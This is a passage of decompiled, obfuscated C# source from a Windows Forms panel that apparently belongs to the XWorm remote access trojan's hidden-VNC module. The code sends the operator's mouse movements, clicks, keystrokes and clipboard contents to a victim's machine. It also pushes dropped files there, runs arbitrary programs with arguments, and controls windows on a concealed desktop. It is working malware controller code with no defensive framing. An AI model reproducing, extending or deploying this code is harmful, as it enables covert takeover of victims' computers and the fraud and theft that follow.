			}, array2);
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		if (bool_0)
		{
			bool_0 = false;
			Timer2.Start();
		}
		else if (int_2 < SystemInformation.DoubleClickTime)
		{
			bool_1 = true;
		}
		if (bool_2)
		{
			bool_2 = false;
			Timer3.Start();
		}
		else if (int_3 < SystemInformation.DoubleClickTime)
		{
			bool_2 = true;
		}
		Point point = checked(new Point((int)Math.Round((double)e.X * ((double)int_0 / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)int_1 / (double)PictureBox1.Height))));
		if (bool_2)
		{
			byte[] array = Module0.smethod_6("MouseDoubleClick" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else if (bool_1)
		{
			if (e.Button == MouseButtons.Left)
			{
				byte[] array2 = Module0.smethod_6("MouseLeftDown" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
				GClass5 gClass2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass2.method_1((byte[])a0);
				}, array2);
			}
		}
		else if (e.Button == MouseButtons.Left)
		{
			byte[] array3 = Module0.smethod_6("MouseLeftDown" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass3 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass3.method_1((byte[])a0);
			}, array3);
		}
		else if (e.Button == MouseButtons.Right)
		{
			byte[] array4 = Module0.smethod_6("MouseRightDown" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass4 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass4.method_1((byte[])a0);
			}, array4);
		}
	}

	private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			Point point = checked(new Point((int)Math.Round((double)e.X * ((double)int_0 / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)int_1 / (double)PictureBox1.Height))));
			byte[] array = Module0.smethod_6("MouseMove" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void PictureBox1_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			byte[] array = Module0.smethod_6("KeyboardDown" + GClass19.string_0 + Conversions.ToString(e.KeyChar));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseHVNC");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		checked
		{
			int_2 += 100;
			if (int_2 >= SystemInformation.DoubleClickTime)
			{
				bool_0 = true;
				bool_1 = false;
				int_2 = 0;
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		checked
		{
			int_3 += 100;
			if (int_3 >= SystemInformation.DoubleClickTime)
			{
				bool_2 = true;
				bool_3 = false;
				int_3 = 0;
			}
		}
	}

	private void PictureBox1_DragEnter(object sender, DragEventArgs e)
	{
		if (e.Data.GetDataPresent(DataFormats.FileDrop))
		{
			e.Effect = DragDropEffects.Copy;
		}
	}

	private void PictureBox1_DragDrop(object sender, DragEventArgs e)
	{
		string[] array = (string[])(object)(string)e.Data.GetData(DataFormats.FileDrop);
		_Closure_0024__R134_002D22 closure_0024__R134_002D = default(_Closure_0024__R134_002D22);
		foreach (string path in array)
		{
			if (File.Exists(path))
			{
				byte[] array2 = Module0.smethod_6("DeskDrop" + GClass19.string_0 + Path.GetFileName(path) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(path))));
				closure_0024__R134_002D = new _Closure_0024__R134_002D22(closure_0024__R134_002D);
				closure_0024__R134_002D._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R134_002D._Lambda_0024__R24, array2);
			}
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "OFF", TextCompare: false) == 0)
		{
			Guna2GradientButton1.Text = "Capturing...";
			Guna2GradientButton1.Image = XWorm_Resources._Stop;
			byte[] array = Module0.smethod_6("Cap" + GClass19.string_0 + Guna2ComboBox1.Text.Replace("%", "").ToString() + GClass19.string_0 + Conversions.ToString(Convert.ToDouble(Guna2ComboBox3.Text.Replace("%", "").ToString()) / 100.0));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else
		{
			Guna2GradientButton1.Text = "OFF";
			Guna2GradientButton1.Image = XWorm_Resources.Play;
		}
	}

	private void Guna2GradientButton6_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(Guna2ComboBox2.Text))
		{
			byte[] array = Module0.smethod_6(Guna2ComboBox2.Text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		using CustomOpen customOpen = new CustomOpen();
		customOpen.Guna2TextBox1.PlaceholderText = "Filename";
		customOpen.Guna2TextBox2.PlaceholderText = "Argument";
		customOpen.StartPosition = FormStartPosition.CenterParent;
		if (customOpen.ShowDialog() == DialogResult.OK)
		{
			byte[] array = Module0.smethod_6("CustomOpen" + GClass19.string_0 + customOpen.Guna2TextBox1.Text + GClass19.string_0 + customOpen.Guna2TextBox2.Text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void Guna2GradientButton3_Click(object sender, EventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("CopyClib" + GClass19.string_0 + System.Windows.Forms.Clipboard.GetText());
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton4_Click(object sender, EventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("Paste" + GClass19.string_0 + Convert.ToBase64String(Encoding.UTF8.GetBytes(System.Windows.Forms.Clipboard.GetText())));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton5_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		switch (Guna2ComboBox4.Text)
		{
			case "Minimize":
				{
					byte[] array3 = Module0.smethod_6("MinTop");
					GClass5 gClass3 = gclass5_0;
					ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
					{
						gClass3.method_1((byte[])a0);
					}, array3);
					break;
				}
			case "Maximize":
				{
					byte[] array2 = Module0.smethod_6("RestoreMaxTop");
					GClass5 gClass2 = gclass5_0;
					ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
					{
						gClass2.method_1((byte[])a0);
					}, array2);
					break;
				}
			case "Close":
				{
					byte[] array = Module0.smethod_6("CloseWindow");
					GClass5 gClass = gclass5_0;
					ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
					{
						gClass.method_1((byte[])a0);
					}, array);
					break;
				}
		}
	}
}